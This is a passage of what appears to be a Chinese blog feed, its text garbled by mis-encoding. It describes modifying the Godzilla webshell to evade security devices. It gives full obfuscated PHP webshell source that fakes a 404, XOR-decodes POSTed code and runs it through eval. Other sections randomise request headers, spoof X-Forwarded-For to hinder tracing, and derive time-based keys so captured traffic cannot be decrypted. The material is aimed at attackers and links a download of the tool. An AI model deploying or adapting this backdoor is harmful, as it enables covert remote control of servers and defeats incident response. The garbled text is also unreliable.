ä¸€ä¸ªshellçš„æ—¶å€™å°±ä¸ä¼šå®šæ­»äº†ï¼Œæ¯æ¬¡éƒ½æ˜¯åŠ¨æ€çš„ã€‚</p><p>åŒæ ·çš„ï¼Œç»™å³è¾¹çš„åˆ—è¡¨ä¹Ÿéšæœºä¸€ä¸‹ï¼Œçœ‹ä¸€ä¸‹ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/image-20250122172138855.png" alt="image-20250122172138855"></p><p>&amp;networkstatus=90&amp;osversion=17&amp;orderdata=72</p><p>&amp;availability=11&amp;networkstatus=47&amp;cartid=51&amp;price=33&amp;orderdata=67</p><p>ä¹Ÿæ˜¯æ¯æ¬¡éƒ½ä¸ä¸€å®šçš„ã€‚</p><p>çœ‹ä¸‹å®é™…æ•ˆæœ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/image-20250122172243935.png" alt="image-20250122172243935"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/image-20250122172317731.png" alt="image-20250122172317731"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/image-20250122172349529.png" alt="image-20250122172349529"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œæ¯æ¬¡éƒ½æ˜¯éšæœºçš„ã€‚</p><h5 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h5><p>å¥½çš„ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹uaï¼ŒåŸæœ¬æ‰“ç®—éšä¾¿å†™ä¸€ä¸‹uaï¼Œéšæœºæ›¿æ¢ï¼Œä½†æ˜¯æƒ³äº†æƒ³ï¼Œè¿˜æ˜¯ä¸è¦è¿™æ ·ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Œæˆ‘ä»¬çš„æµé‡ä¸»è¦æ˜¯é’ˆå¯¹å®‰å…¨è®¾å¤‡çš„ï¼Œå¦‚æœä½ çš„uaæ˜¯é‚£ç§éå¸¸éšä¾¿çš„ï¼Œæˆ–è€…å¾ˆè€çš„é‚£ç§æœºå™¨uaï¼Œåº”è¯¥ä¸å¥½ã€‚æˆ‘ä»¬è¿˜æ˜¯ç”¨å¹³å¸¸ä½¿ç”¨çš„uaï¼Œæˆ‘è¿™é‡Œå°†æˆ‘å¹³å¸¸åœ¨edgeï¼Œç«ç‹ã€googleã€pcç«¯å’Œmacosç«¯çš„uaæ”¶é›†äº†ä¸€ä¸‹ï¼Œä»è¿™å‡ ä¸ªä¸­uaä¸­éšæœºé€‰ä¸€ä¸ªä½¿ç”¨ï¼Œè¿™æ ·uaå°±æ˜¯ä¸€ä¸ªæ­£å¸¸ä½¿ç”¨çš„uaäº†ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/image-20250122172653987.png" alt="image-20250122172653987"></p><h5 id="Accept-Language"><a href="#Accept-Language" class="headerlink" title="Accept-Language"></a>Accept-Language</h5><p>Accept-Languageï¼šè¡¨ç¤ºæµè§ˆå™¨æ‰€æ”¯æŒçš„è¯­è¨€ã€‚</p><p>å½“æˆ‘ä»¬åœ¨å¼€å‘å›½é™…åŒ–çš„ç½‘ç«™æ—¶ï¼Œåç«¯æ¥å£çš„ä¿¡æ¯éœ€è¦æ ¹æ®ç”¨æˆ·æ‰€ä½¿ç”¨çš„è¯­è¨€è¿”å›å¯¹åº”çš„å†…å®¹ã€‚ä½œä¸ºåç«¯æˆ‘éœ€è¦å‰ç«¯åœ¨è¯·æ±‚å¤´çš„Accept-Languageå±æ€§å£°æ˜éœ€è¦è¿”å›çš„è¯­è¨€ã€‚</p><p>Accept-Language: zh-cn,zh;q=0.5<br>æ„æ€ï¼š æ”¯æŒçš„è¯­è¨€åˆ†åˆ«æ˜¯ç®€ä½“ä¸­æ–‡å’Œä¸­æ–‡ï¼Œä¼˜å…ˆæ”¯æŒç®€ä½“ä¸­æ–‡ã€‚<br>zh-cn:è¡¨ç¤ºç®€ä½“ä¸­æ–‡ï¼Œzh:è¡¨ç¤ºä¸­æ–‡ï¼ˆåŒ…æ‹¬ç®€ä½“ä¸­æ–‡ï¼Œç¹ä½“ä¸­æ–‡ï¼‰</p><p>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8<br>æ„æ€ï¼šä¼˜å…ˆæ”¯æŒä¸­æ–‡ï¼Œå¦‚æœæ²¡æœ‰ä¸­æ–‡åˆ™æ”¯æŒè‹±æ–‡ã€‚<br>q:è¡¨ç¤ºä»–ä¹‹å‰è¯­è¨€çš„æƒé‡, 0 &lt;= q &lt;= 1</p><p>è¿™é‡Œç¬”è€…é€‰æ‹©äº†æˆ‘æµè§ˆå™¨è®¿é—®ç½‘ç«™ä¸­å‡ ä¸ªå¸¸ç”¨çš„Accept-Languageè¿›è¡Œéšæœºé€‰æ‹©ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-4/image-20250122173343028.png" alt="image-20250122173343028"></p><h5 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h5><p>ç„¶åå‘¢ï¼Œè¿˜åŠ äº†ä¸€ä¸ª</p><p><code>X-Forwarded-For: 127.0.0.1</code></p><p>è¿™é‡Œç¬”è€…åªåŠ äº†ä¸€ä¸ªX-Forwarded-Forï¼Œåœ¨æˆ‘ä»¬å¹³å¸¸è®¿é—®ç½‘ç«™çš„æ—¶å€™ï¼Œæœ‰å¾ˆå¤šç½‘ç«™éƒ½ä¼šè¯†åˆ«X-Forwarded-Forçš„å€¼ï¼Œå¦‚æœç¢°å·§åœ¨æˆ‘ä»¬æ‰“æˆ˜çš„æ—¶å€™ï¼Œæœ‰ç½‘ç«™è¯†åˆ«xff,é‚£æˆ‘ä»¬å°±èƒ½è¿·æƒ‘ç®¡ç†å‘˜ä¸€ä¸‹ï¼Œæº¯æºçš„æ—¶å€™å—ï¼Œè®©ä»–ä¸å¥½æº¯æºã€‚ä¸‹é¢æ˜¯ä¸€äº›å¸¸ç”¨çš„xffï¼Œå¤§å®¶è‡ªè¡Œé€‰æ‹©ä½¿ç”¨ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Client-Ip: 127.0.0.1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Remote-Addr: 127.0.0.1</span><br><span class="line">X-Real-Ip: 127.0.0.1</span><br><span class="line">REMOTE-HOST: 127.0.0.1</span><br><span class="line">via:127.0.0.1</span><br><span class="line">Client-Ip: 127.0.0.1 </span><br><span class="line"></span><br><span class="line">Â varÂ list_of_fake_ip_headersÂ =Â [&quot;X-Forwarded-For&quot;,&quot;X-Forwarded&quot;,&quot;Forwarded-For&quot;,&quot;Forwarded&quot;,&quot;X-Forwarded-Host&quot;,&quot;X-remote-IP&quot;,&quot;X-remote-addr&quot;,&quot;True-Client-IP&quot;,&quot;X-Client-IP&quot;,&quot;Client-IP&quot;,&quot;X-Real-IP&quot;,&quot;Ali-CDN-Real-IP&quot;,&quot;Cdn-Src-Ip&quot;,&quot;Cdn-Real-Ip&quot;,&quot;CF-Connecting-IP&quot;,&quot;X-Cluster-Client-IP&quot;,&quot;WL-Proxy-Client-IP&quot;,&quot;Proxy-Client-IP&quot;,&quot;Fastly-Client-Ip&quot;,&quot;True-Client-Ip&quot;];</span><br></pre></td></tr></table></figure><h5 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h5><p>æœ¬æ–‡å¯¹å·¦å³è¿½åŠ æ•°æ®è¿›è¡Œç®€å•ä¿®æ”¹ï¼Œæ¯æ¬¡æ·»åŠ shellçš„æ—¶å€™ï¼Œéšæœºæ·»åŠ ä¸€äº›å·¦å³æ•°æ®ï¼Œæ¥å¢åŠ æ··æ·†ã€‚å¯¹headerè¿›è¡Œä¼˜åŒ–ï¼Œéšæœºuaï¼ŒéšæœºAccept-Languageï¼Œå’ŒåŠ äº†xffå¤´ï¼Œè¿·æƒ‘ä¸€äº›æ£€æµ‹xffçš„è®¾å¤‡ã€‚</p><h5 id="ä¸‹ä¸ªç‰ˆæœ¬"><a href="#ä¸‹ä¸ªç‰ˆæœ¬" class="headerlink" title="ä¸‹ä¸ªç‰ˆæœ¬"></a>ä¸‹ä¸ªç‰ˆæœ¬</h5><p>1.1ç‰ˆæœ¬æ·»åŠ æœ¨é©¬çš„å…æ€ï¼Œå…¨è¯­è¨€éƒ½åšå¥½äº†ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æ”¹æµé‡ä»¥åŠåŠ å¯†æ–¹å¼ï¼Œåªæ˜¯åšäº†ä¼ªè£…ã€‚1.2ç‰ˆæœ¬åšäº†åŠ¨æ€å¯†é’¥ã€‚<br>åé¢éœ€è¦åšçš„ï¼šä¿®æ”¹ä¸€ä¸‹åŠ å¯†æ–¹å¼ï¼Œè¿™æ ·çš„è¯ä¼šæ›´å¥½ä¸€ç‚¹ã€‚è¿˜æœ‰å°±æ˜¯messageå…¶å®æ˜¯å›ºå®šçš„ï¼Œå¸Œæœ›èƒ½è®©ä»–åŠ¨èµ·æ¥ã€‚</p><h5 id="ä¸‹è½½ã€ä½¿ç”¨"><a href="#ä¸‹è½½ã€ä½¿ç”¨" class="headerlink" title="ä¸‹è½½ã€ä½¿ç”¨"></a>ä¸‹è½½ã€ä½¿ç”¨</h5><p>ä»€ä¹ˆï¼Œä½ è¯´çœ‹ä¸æ˜ç™½ã€ä¸æƒ³åŠ¨æ‰‹ã€å¤ªéº»çƒ¦ï¼Œæ²¡äº‹ï¼Œå»ä¸‹è½½å°±å¯ä»¥äº†ã€‚<br><a href="https://github.com/Bohemiana/godzilla_erkai">https://github.com/Bohemiana/godzilla_erkai</a></p><h5 id="è‡´è°¢"><a href="#è‡´è°¢" class="headerlink" title="è‡´è°¢"></a>è‡´è°¢</h5><p>æœ€åæ„Ÿè°¢æ‚¨è¯»åˆ°ç°åœ¨ï¼Œè¿™ç¯‡æ–‡ç« åŒ†å¿™æ„æˆè‚¯å®šæœ‰ä¸å‘¨åˆ°æˆ–æè¿°ä¸æ­£ç¡®çš„åœ°æ–¹ï¼ŒæœŸå¾…ä¸šç•Œå¸ˆå‚…ä»¬ç”¨å„ç§æ–¹å¼æŒ‡æ­£å‹˜è¯¯ã€‚</p><h5 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BeichenDream/Godzilla            åŸç‰ˆå“¥æ–¯æ‹‰</span><br></pre></td></tr></table></figure><blockquote><p>emmm å¤ªèœäº†<br>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> godzilla </tag>
            
            <tag> äºŒå¼€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å“¥æ–¯æ‹‰äºŒå¼€ä»0åˆ°1-3(åŠ¨æ€å¯†é’¥)</title>
      <link href="/2024/12/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/"/>
      <url>/2024/12/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/</url>
      
        <content type="html"><![CDATA[<h5 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h5><p>æœ‰å°ä¼™ä¼´è¯´ï¼Œä¸Šé¢çš„æ–‡ç« éƒ½åšäº†åŠ¨æ€çš„å…æ€ï¼Œæ¯æ¬¡ç”Ÿæˆçš„æœ¨é©¬éƒ½ä¸ä¸€æ ·ï¼Œè¿˜æŒºå¥½çš„ï¼Œè¿˜æœ‰æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿å¯ä»¥åšæˆåŠ¨æ€çš„ï¼Œæˆ‘æƒ³äº†æƒ³ï¼Œå¦‚æœæŠŠæˆ‘ä»¬çš„å¯†é’¥åšæˆåŠ¨æ€çš„ï¼Œé‚£å²‚ä¸æ˜¯ï¼Œç®€å•çš„å®ç°äº†åŠ¨æ€åŠ å¯†ã€‚</p><h5 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h5><p>é¦–å…ˆæˆ‘ä»¬æ¥çœ‹ï¼Œå“¥æ–¯æ‹‰çš„åŠ å¯†ä¼ è¾“è¿‡ç¨‹</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20241224145346679.png" alt="image-20241224145346679"></p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæœ‰ä¸¤ä¸ªå…³é”®ç‚¹ï¼Œå°±æ˜¯  passå’Œkey</p><p>passå°±æ˜¯ä¼ é€’çš„é”®ï¼Œpayloadä¸ºå€¼ï¼Œpayloadæ˜¯ç”±keyæ§åˆ¶çš„ï¼Œå› ä¸ºä½ æ¯æ¬¡éœ€è¦å‘é€çš„ä¸œè¥¿  éƒ½ä¼šè¿›è¡Œå¼‚æˆ–ä¸€ä¸‹ã€‚å¦‚æœè¿™é‡Œï¼Œæˆ‘ä»¬æŠŠkeyè®¾æˆåŠ¨æ€çš„ï¼Œé‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´ï¼Œpayloadå°±ä¼šæ˜¯åŠ¨æ€çš„ã€‚å½“ç„¶ï¼Œè¿™ä¸æ˜¯é‡ç‚¹ï¼Œé‡ç‚¹æ˜¯ï¼Œå¦‚æœå¯¹æ–¹çš„å®‰å…¨è®¾å¤‡ä¸Šï¼Œæ•è·äº†æˆ‘ä»¬çš„æµé‡ï¼Œä»–æƒ³è§£å¯†æˆ‘ä»¬åœ¨å…¶ä¸­åšäº†ä»€ä¹ˆï¼Œé‚£ä¹ˆå°±éœ€è¦keyè§£å¯†ï¼Œçœ‹å›¾ä¸­çš„ç¬¬å…«æ­¥ï¼Œæ‰§è¡Œçš„ç»“æœéœ€è¦xoræ‰èƒ½è·å–å€¼ã€‚å¥½ï¼Œå¦‚æœæˆ‘ä»¬çš„æœ¨é©¬æ–‡ä»¶ä¸­ï¼Œæ²¡æœ‰å†™keyï¼Œæˆ–è€…æŠŠkeyå†™æˆåŠ¨æ€çš„ï¼Œå¦‚æœä»–ä¸çŸ¥é“keyæ˜¯ä»€ä¹ˆï¼Œé‚£ä¹ˆä»–å°±è§£ä¸å‡ºæ¥äº†æˆ‘ä»¬åšäº†ä»€ä¹ˆäº†ã€‚å½“ç„¶ï¼Œkeyæ˜¯å¯ä»¥çˆ†ç ´çš„ï¼Œå°±æ˜¯æ¯”è¾ƒéº»çƒ¦äº†ã€‚</p><h5 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h5><p>è¿™é‡Œæˆ‘ä»¬ä¹Ÿå¯ä»¥æƒ³åˆ°ï¼Œå› ä¸ºæˆ‘ä»¬å¿…é¡»è¦ä¼ ä¸Šå»ä¸€ä¸ªæœ¨é©¬ï¼Œæœ¨é©¬ä¸­å¿…å®šå¸¦keyå’Œpassï¼Œå¹¶ä¸”æœ¬åœ°ä¹Ÿéœ€è¦çŸ¥é“è¿™ä¸ªkeyï¼Œå»å’ŒæœåŠ¡ç«¯é€šä¿¡ã€‚å¦‚æœå®¢æˆ·ç«¯å‘é€ä¸€ä¸ªkey  å†åœ¨æœ¨é©¬ä¸­ä½¿ç”¨ï¼Œé‚£ä¹ˆæµé‡ä¸­å°±ä¼šæš´æ¼keyäº†ã€‚é‚£ä¹ˆï¼Œç›®å‰æ¥çœ‹æœ€å¥½çš„åå•†å¯†é’¥å°±æ˜¯æ—¶é—´ï¼Œæˆ‘ä»¬çš„å“¥æ–¯æ‹‰è‚¯å®šæ˜¯è¿è¡Œåœ¨æœ¬åœ°çš„ï¼Œé‚£ä¹ˆæ—¶é—´è‚¯å®šæ˜¯å‡†çš„ï¼Œå‡è®¾ï¼ŒæœåŠ¡å™¨æ—¶é—´ä¹Ÿæ˜¯å‡†çš„ï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬æ¯æ¬¡æ‰§è¡Œéƒ½éœ€è¦keyï¼Œé‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´keyåœ¨å˜åŒ–ï¼Œæˆ‘ä»¬çš„payloadä¹Ÿåœ¨å˜åŒ–ã€‚å¦‚æœè¿ç»´äººå‘˜éœ€è¦è§£å¯†ï¼Œé‚£ä¹ˆï¼Œå°†éœ€è¦æ›´å¤šçš„æ—¶é—´ã€‚</p><p>æˆ‘ä»¬åœ¨å‡è®¾ä¸€ä¸ªåœºæ™¯ï¼Œç†æƒ³åŒ–ä¸€ç‚¹å½“ç„¶å¦‚æœæœåŠ¡å™¨çš„æ—¶é—´å’Œæœ¬åœ°æ—¶é—´æ˜¯å‡†çš„ï¼Œè€Œå®‰å…¨è®¾å¤‡çš„æ—¶é—´å’ŒæœåŠ¡å™¨çš„æ—¶é—´ä¸åŒæ­¥ï¼Œé‚£ä¹ˆä»–å¯èƒ½å°±è§£ä¸å‡ºæ¥æˆ‘ä»¬çš„æµé‡äº†ï¼Œä¹Ÿå°±æ˜¯ä¸çŸ¥é“æˆ‘ä»¬å…·ä½“åšäº†ä»€ä¹ˆäº†ã€‚æ€è·¯æœ‰äº†ï¼Œä¸‹é¢æ¥å…·ä½“å®ç°ã€‚</p><h5 id="php-å®ç°åŠ¨æ€å¯†é’¥"><a href="#php-å®ç°åŠ¨æ€å¯†é’¥" class="headerlink" title="php å®ç°åŠ¨æ€å¯†é’¥"></a>php å®ç°åŠ¨æ€å¯†é’¥</h5><p>ç›´æ¥åœ¨æˆ‘ä»¬å…æ€çš„åŸºç¡€ä¸Šæ”¹ä¸€ä¸‹ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?pHP</span></span><br><span class="line">ini_set(<span class="string">&#x27;error_reporting&#x27;</span>,chr(<span class="number">48</span>));</span><br><span class="line">header(<span class="string">&quot;HTTP/1.0 404 Not Found&quot;</span>);</span><br><span class="line">call_user_func(nsfocus(<span class="string">&quot;c2V0X3RpbWVfbGltaXQ=&quot;</span>), <span class="number">48</span>);</span><br><span class="line"><span class="variable">$asiainfosec</span> = Chr(<span class="number">98</span>).Chr(<span class="number">97</span>).Chr(<span class="number">115</span>).Chr(<span class="number">101</span>).Chr(<span class="number">54</span>).Chr(<span class="number">52</span>).Chr(<span class="number">95</span>);</span><br><span class="line"><span class="variable">$huawei</span> = <span class="string">&quot;\x63\x6f\x64\x65&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hillstonenet</span>(<span class="params"><span class="comment">/*antiy*/</span><span class="variable">$chaitin</span>,<span class="variable">$topsec</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$damddos</span>=Chr(<span class="string">&quot;48&quot;</span>);<span class="variable">$damddos</span>&lt;strlen(<span class="variable">$chaitin</span>);<span class="variable">$damddos</span>++) &#123;</span><br><span class="line">        <span class="variable">$dbappsecurity</span> = <span class="variable">$topsec</span>[<span class="variable">$damddos</span>+Chr(<span class="string">&quot;49&quot;</span>)&amp;chr(<span class="number">49</span>).chr(<span class="number">53</span>)];</span><br><span class="line">        <span class="variable">$chaitin</span>[<span class="variable">$damddos</span>] = <span class="variable">$chaitin</span>[<span class="variable">$damddos</span>]^<span class="variable">$dbappsecurity</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$chaitin</span>;</span><br><span class="line">&#125;<span class="variable">$sangfor</span>=nsfocus(<span class="string">&quot;cGFzcw==&quot;</span>);<span class="variable">$threatbook</span> = nsfocus(<span class="string">&quot;WVhsc2IyRms=&quot;</span>);</span><br><span class="line"><span class="variable">$qianxin</span> = <span class="variable">$asiainfosec</span>.Chr(<span class="number">101</span>).Chr(<span class="number">110</span>).<span class="variable">$huawei</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">nsfocus</span>(<span class="params"><span class="variable">$strshiwu</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$asiainfosec</span>,<span class="variable">$huawei</span>;</span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$asiainfosec</span>.Chr(<span class="number">100</span>).Chr(<span class="number">101</span>).<span class="variable">$huawei</span>;</span><br><span class="line">    <span class="keyword">return</span> call_user_func(<span class="variable">$func</span>, <span class="variable">$strshiwu</span>);</span><br><span class="line">&#125;<span class="variable">$qingteng</span>=nsfocus(<span class="string">&quot;M2M2ZTBiOGE5YzE1MjI0YQ==&quot;</span>);</span><br><span class="line"><span class="variable">$venustech</span> = nsfocus(<span class="string">&quot;WjJWMFFtRnphV056U1c1bWJ3PT0=&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span><span class="comment">/*qingteng*/</span>[<span class="variable">$sangfor</span>])) &#123;</span><br><span class="line">    @session_start();</span><br><span class="line">    <span class="variable">$alibaba</span>=hillstonenet<span class="comment">/*antiy*/</span>(nsfocus(<span class="variable">$_POST</span>[<span class="variable">$sangfor</span>]),<span class="variable">$qingteng</span>);<span class="keyword">if</span> (<span class="comment">/*antiy*/</span><span class="keyword">isset</span>(<span class="variable">$_SESSION</span><span class="comment">/*leadsec*/</span>[<span class="variable">$dptech</span>])) &#123;</span><br><span class="line"><span class="variable">$antiy</span>=hillstonenet(<span class="variable">$_SESSION</span><span class="comment">/*hillstonenet*/</span>[<span class="variable">$dptech</span>],<span class="variable">$qingteng</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="comment">/*antiy*/</span>strpos(<span class="variable">$antiy</span>,nsfocus<span class="comment">/*antiy*/</span>(<span class="variable">$venustech</span>))===<span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$antiy</span>=hillstonenet<span class="comment">/*antiy*/</span>(<span class="variable">$antiy</span>,<span class="variable">$qingteng</span>);</span><br><span class="line">&#125;define(<span class="string">&quot;leadsec&quot;</span>,<span class="string">&quot;//alibaba\r\n&quot;</span>.<span class="variable">$antiy</span>);@<span class="keyword">eval</span>(leadsec);<span class="keyword">echo</span> <span class="string">&quot;&#123;\&quot;message\&quot;:\&quot;&quot;</span>.<span class="variable">$qianxin</span>(hillstonenet(@run(<span class="variable">$alibaba</span>),<span class="variable">$qingteng</span>)).<span class="string">&quot;\&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="keyword">if</span> (strpos<span class="comment">/*nsfocus*/</span>(<span class="variable">$alibaba</span>,nsfocus(<span class="variable">$venustech</span>))!==<span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$dptech</span>]=hillstonenet(<span class="variable">$alibaba</span>,<span class="variable">$qingteng</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>$qingteng=nsfocus(â€œM2M2ZTBiOGE5YzE1MjI0YQ==â€);  ä¸ºkeyçš„base64,</p><p>å…ˆçœ‹ä¸‹æ—¶é—´</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106110658577.png" alt="image-20250106110658577"></p><p>phpå¾ˆç®€å•å°±èƒ½è·å–åˆ°ï¼Œåœ¨å–è¯¥æ—¶é—´çš„md5çš„å‰16ä½</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106110937329.png" alt="image-20250106110937329"></p><p>å¯ä»¥çœ‹åˆ°ä¹Ÿå¯ä»¥å–åˆ°ï¼Œé‚£ä¹ˆï¼Œç»™åˆ°æˆ‘ä»¬å®šä¹‰çš„keyå³å¯ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106111038800.png" alt="image-20250106111038800"></p><p>ä¹Ÿå°±æ˜¯è¿™æ ·ã€‚</p><p>å¥½ï¼Œæœ¨é©¬åšå¥½ä¹‹åï¼Œå°±æ˜¯å®¢æˆ·ç«¯äº†ã€‚æˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹å®¢æˆ·ç«¯ã€‚</p><p>åˆ°è¿æ¥çš„ä»£ç ä¸­æ”¹ä¸€ä¸‹ï¼Œå’Œphpçš„ä¸€æ ·ï¼Œè¦ä¸¥æ ¼ä¸€æ ·ï¼Œä¸ç„¶md5ä¸å¯¹ï¼Œè‚¯å®šæ˜¯è¿ä¸ä¸Šçš„ï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106111257535.png" alt="image-20250106111257535"></p><p>å…ˆè·å–æ—¶é—´ï¼Œåœ¨md5 åœ¨å–å‰åå…­ä½ï¼Œåœ¨å¤åˆ¶ç»™keyå°±å¯ä»¥äº†ã€‚</p><p>çœ‹ä¸‹æœ¨é©¬çš„keyï¼Œ<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106111506618.png" alt="image-20250106111506618"></p><p>ç®€å•éšæœºï¼Œä¸å›ºå®š</p><p>æ‰“åŒ…ç¼–è¯‘å³å¯ã€‚</p><p>æ¥æµ‹è¯•ä¸€ä¸‹ã€‚</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106111624123.png" alt="image-20250106111624123"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106111737530.png" alt="image-20250106111737530"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106111750915.png" alt="image-20250106111750915"></p><p>åŠŸèƒ½éƒ½æ²¡æœ‰é—®é¢˜ã€‚</p><p>å¥½ï¼Œç°åœ¨æ¥è¯´ä¸€ä¸‹ç¼ºç‚¹ï¼Œæ²¡è¯´ä¹‹å‰ï¼Œæˆ‘ä»¬è¿˜æ˜¯è¦ä»”ç»†çš„æ¥äº†è§£ä¸€ä¸‹å“¥æ–¯æ‹‰çš„ä¼ é€’å‚æ•°åŸç†ã€‚</p><p>åœ¨</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106112822066.png" alt="image-20250106112822066"></p><p>è¿™ä¸ªç•Œé¢ï¼Œæˆ‘ä»¬ç‚¹å‡»æµ‹è¯•çš„æ—¶å€™ï¼Œå“¥æ–¯æ‹‰ä¼šä¼ é€’ä¸€ä¸ªå¤§åŒ…ï¼Œ</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-3/image-20250106112904595.png" 